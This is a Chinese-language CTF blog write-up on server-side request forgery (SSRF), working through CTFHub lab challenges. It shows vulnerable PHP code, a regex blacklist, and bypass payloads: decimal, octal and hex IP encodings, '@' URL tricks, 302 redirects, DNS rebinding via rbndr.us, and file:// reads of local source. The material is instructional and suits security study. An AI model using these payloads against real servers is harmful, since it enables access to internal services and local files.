<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240607062145487.png" alt="image-20240607062145487"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240607062200760.png" alt="image-20240607062200760"></p>
<p><strong>原理</strong></p>
<p><strong>@<strong>前面会被解析成</strong>用户名</strong>，后面是访问<strong>地址</strong>（语法规定）</p>
<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p><strong>绕过SSRF的方法</strong></p>
<p>1.攻击本地</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:80</span><br><span class="line">http://localhost:22</span><br></pre></td></tr></table></figure>

<p>2.利用[::]</p>
<p>http:&#x2F;&#x2F;[::]:80&#x2F; &#x3D;&gt;<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
<p>不加端口的话是http:&#x2F;&#x2F;[::]&#x2F;</p>
<p><strong>3.利用@</strong></p>
<p><strong>这里就是在指定的网址后加@+127.0.0.1</strong></p>
<p>4.利用短域名</p>
<p><a target="_blank" rel="noopener" href="http://dwz.cn/11SMa">http://dwz.cn/11SMa</a> &gt;&gt;&gt; <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
<p>5.利用特殊域名</p>
<p>原理是DNS解析</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io/">http://127.0.0.1.xip.io/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.owasp.org.127.0.0.1.xip.io/">http://www.owasp.org.127.0.0.1.xip.io/</a></p>
<p>6.利用DNS解析</p>
<p>在域名上设置A记录，指向127.0.0.1</p>
<p>7.利用上传</p>
<p>修改”type&#x3D;file”为”type&#x3D;url”</p>
<p>比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</p>
<p>8.利用句号</p>
<p>127。0。0。1&#x3D;&gt;127.0.0.1</p>
<p>9.进行进制转换</p>
<p>可以是十六进制，八进制等。<br>115.239.210.26 &gt;&gt;&gt; 16373751032<br>首先把这四段数字给分别转成16进制，结果：73 ef d2 1a<br>然后把 73efd21a 这十六进制一起转换成8进制<br>记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</p>
<p>10.利用特殊地址</p>
<p><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0/</a></p>
<h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240607063502134.png" alt="image-20240607063502134"></p>
<ul>
<li>根据题目意思，ban掉了127和172</li>
<li>不能使用点分十进制访问127.0.0.1</li>
</ul>
<p>那么我们就考虑用<strong>进制转换</strong></p>
<h4 id="法一-进制转换"><a href="#法一-进制转换" class="headerlink" title="法一 进制转换"></a>法一 进制转换</h4><h4 id="十进制-连续-1"><a href="#十进制-连续-1" class="headerlink" title="十进制(连续)"></a>十进制(连续)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2130706433/flag.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240607063638631.png" alt="image-20240607063638631"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240607063649682.png" alt="image-20240607063649682"></p>
<h4 id="八进制-1"><a href="#八进制-1" class="headerlink" title="八进制"></a>八进制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://017700000001/flag.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240607063735122.png" alt="image-20240607063735122"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240607063739155.png" alt="image-20240607063739155"></p>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0177.0000.0001/flag.php 不行</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="十六进制-1"><a href="#十六进制-1" class="headerlink" title="十六进制"></a>十六进制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0x7F000001/flag.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240607063922666.png" alt="image-20240607063922666"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240607063924052.png" alt="image-20240607063924052"></p>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0x7F.0.0.1/flag.php 不行</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://0x7F.0x00.0x00.0x01/flag.php 不行</span><br></pre></td></tr></table></figure>

<h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608152121396.png" alt="image-20240608152121396"></p>
<ul>
<li>查看网页源代码<code>file:///var/www/html/index.php</code></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608152325840.png" alt="image-20240608152325840"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#x27;url&#x27;])) &#123;</span><br><span class="line">    header(&quot;Location: /?url=_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_REQUEST[&#x27;url&#x27;];</span><br><span class="line"></span><br><span class="line">if (preg_match(&quot;/127|172|10|192/&quot;, $url)) &#123;</span><br><span class="line">    exit(&quot;hacker! Ban Intranet IP&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>

<ul>
<li>限制了127&#x2F;172&#x2F;10&#x2F;192</li>
</ul>
<p>可用<code>localhost</code>代替<code>127.0.0.1</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608152159669.png" alt="image-20240608152154809"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608152204144.png" alt="image-20240608152204144"></p>
<h3 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608153021062.png" alt="image-20240608153021062"></p>
<h4 id="浅谈DNS重绑定"><a href="#浅谈DNS重绑定" class="headerlink" title="浅谈DNS重绑定"></a>浅谈DNS重绑定</h4><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89426041">浅谈DNS重绑定漏洞 - 知乎 (zhihu.com)</a></p>
<hr>
<ul>
<li>进入环境，尝试访问<code>127.0.0.1/flag.php</code></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608153111686.png" alt="image-20240608153111686"></p>
<ul>
<li>通过file协议查看网页源代码<code>file:///var/www/html/index.php</code></li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608153150172.png" alt="image-20240608153150172"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#x27;url&#x27;])) &#123;</span><br><span class="line">    header(&quot;Location: /?url=_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_REQUEST[&#x27;url&#x27;];</span><br><span class="line"></span><br><span class="line">if (preg_match(&quot;/127|172|10|192/&quot;, $url)) &#123;</span><br><span class="line">    exit(&quot;hacker! Ban Intranet IP&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>emmm，跟上一题一样的黑名单，还是ban掉了<code>127|172|10|192</code></li>
</ul>
<h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><ul>
<li>试了一下用localhost代替127.0.0.1</li>
<li>就拿到flag了。。。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608153321221.png" alt="image-20240608153321221"></p>
<hr>
<p>不过题目要求以<code>DNS重绑定</code>的方式绕过：</p>
<h4 id="DNS-重绑定"><a href="#DNS-重绑定" class="headerlink" title="DNS 重绑定"></a>DNS 重绑定</h4><ul>
<li>通过<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service</a>网站设置DNS：</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608153631791.png" alt="image-20240608153631791"></p>
<ul>
<li>使用生成的域名构造payload：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=7f000001.7f000002.rbndr.us/flag.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608153813385.png" alt="image-20240608153813385"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608153819321.png" alt="image-20240608153819321"></p>
<ul>
<li>成功拿到flag</li>
</ul>
<hr>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608154002567.png" alt="image-20240608154002567"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=7f000001.7f000005.rbndr.usv/flag.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/2024/05/16/SSRF/image-20240608154054957.png" alt="image-20240608154054957"></p>
<ul>
<li>同样也可以</li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">MooSe</div><div class="post-copyright__author_desc">乐孜不疲，元气满满</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/05/16/SSRF/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/05/16/SSRF/')">SSRF</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2024/05/16/SSRF/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=SSRF&amp;url=http://example.com/2024/05/16/SSRF/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">MooSe的小窝</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/20/Python-Flask%E6%A1%86%E6%9E%B6/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Python-Flask框架</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/08/%E6%A0%A1%E8%B5%9B%E9%A2%98%E8%A7%A3/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">校赛题解</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/moose.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/MooSeQAQ/tuchuang@main/img/studyinging.jpg" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这是<b style="color:#fff">MooSe</b>的BLOG,主要记录与<b style="color:#fff">CTF</b>相关的<b style="color:#fff">笔记</b>与心得</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">希望你可以在这里找到对你有用的<b style="color:#fff">灵感</b>和<b style="color:#fff">启发</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">MooSe</h1><div class="author-info__desc">乐孜不疲，元气满满</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/MooSeQAQ" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">SSRF 学习笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">SSRF简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">SSRF漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">SSRF漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E4%B8%ADurl%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">SSRF中url的伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.1.</span> <span class="toc-text">file:&#x2F;&#x2F;伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file-etc-password"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">file:&#x2F;&#x2F;&#x2F;etc&#x2F;password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-etc-hosts"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">file:&#x2F;&#x2F;&#x2F;etc&#x2F;&#x2F;hosts</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-proc-net-arp"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">file:&#x2F;&#x2F;&#x2F;proc&#x2F;net.arp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-proc-net-fib-trie"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;fib_trie</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dict%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">dict伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.3.</span> <span class="toc-text">http伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.4.</span> <span class="toc-text">gopher伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GET%E6%8F%90%E4%BA%A4"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">GET提交</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">1.2.4.1.1.</span> <span class="toc-text">法一：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.2.4.1.2.</span> <span class="toc-text">法二</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E6%8F%90%E4%BA%A4"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">POST提交</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A-1"><span class="toc-number">1.2.4.2.1.</span> <span class="toc-text">法一：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">1.2.4.2.2.</span> <span class="toc-text">法二：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A7%E7%94%9FSSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">产生SSRF漏洞的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81file-get-contents"><span class="toc-number">1.3.1.</span> <span class="toc-text">1、file_get_contents:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81sockopen"><span class="toc-number">1.3.2.</span> <span class="toc-text">2、sockopen():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81curl-exec"><span class="toc-number">1.3.3.</span> <span class="toc-text">3、curl_exec():</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">SSRF绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 